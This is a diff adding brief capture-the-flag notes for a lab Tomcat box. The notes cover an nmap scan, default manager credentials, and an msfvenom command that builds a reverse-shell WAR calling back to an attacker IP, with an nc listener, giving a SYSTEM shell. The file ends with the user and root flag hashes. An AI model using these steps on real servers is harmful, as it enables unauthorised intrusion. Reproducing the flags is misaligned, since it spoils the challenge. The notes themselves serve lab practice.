@@ -1,0 +1,19 @@
+nmap -sC -sV -oN nmap 10.10.10.95 -v -A
+
+only port 8080 is open -> Apache Tomcat/7.0.88
+
+default creds : tomcat:s3cret
+
+Tomcat RCE via JSP Upload Bypass -> doesnt work
+
+lets try to upload backdoor in WAR format following
+https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.34 LPORT=4444 -f war > shell.war
+then upload it and go to 10.10.10.95/shell after nc -lvnp 4444
+-> shell as authority\system
+
+flag in C:\Users\Administrator\Desktop\flags
+
+user: 7004dbcef0f854e0fb401875f26ebd00
+root: 04a8b36e1545a455393d067e772fe90e
